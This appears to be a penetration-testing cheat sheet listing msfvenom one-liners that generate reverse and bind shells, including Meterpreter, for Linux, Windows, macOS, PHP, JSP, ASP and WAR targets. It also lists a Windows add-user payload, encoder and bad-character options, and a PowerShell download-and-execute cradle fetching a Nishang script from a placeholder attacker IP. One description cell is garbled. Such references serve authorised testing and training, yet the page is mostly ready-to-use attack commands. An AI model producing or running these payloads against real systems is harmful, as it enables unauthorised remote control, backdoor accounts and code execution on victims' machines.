# OneLiner - MSFVenom

<table data-full-width="true"><thead><tr><th width="495.5">MSFVenom Payload Generation One-Liner</th><th>Description</th></tr></thead><tbody><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -l payloads
</code></pre></td><td>List available payloads</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p PAYLOAD --list-options
</code></pre></td><td>List payload options</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP
</code></pre></td><td>Payload Encoding</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
</code></pre></td><td>Linux Meterpreter reverse shell x86 multi stage</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
</code></pre></td><td>Linux Meterpreter bind shell x86 multi stage</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
</code></pre></td><td>Linux bind shell x64 single stage</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
</code></pre></td><td>Linux reverse shell x64 single stage</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
</code></pre></td><td>Windows Meterpreter reverse shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
</code></pre></td><td>Windows Meterpreter http reverse shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
</code></pre></td><td>Windows Meterpreter bind shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
</code></pre></td><td>Windows CMD Multi Stage</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
</code></pre></td><td><code>Windows CMD Single Stage</code></td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
</code></pre></td><td>Windows add user</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
</code></pre></td><td>Mac Reverse Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
</code></pre></td><td>Mac Bind shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
</code></pre></td><td>Python Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
</code></pre></td><td>BASH Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
</code></pre></td><td>PERL Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
</code></pre></td><td>ASP Meterpreter shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
</code></pre></td><td>JSP Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
</code></pre></td><td>WAR Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
</code></pre></td><td>pbcopy &#x26;&#x26; echo '?php '</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
</code></pre></td><td>Php Reverse Shell</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\
"" -f python
</code></pre><p></p></td><td>Windows Exec Nishang Powershell in python</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
</code></pre></td><td>Bad characters shikata_ga_nai</td></tr><tr><td><pre class="language-sh"><code class="lang-sh">msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
</code></pre></td><td>Bad characters fnstenv_mov</td></tr></tbody></table>
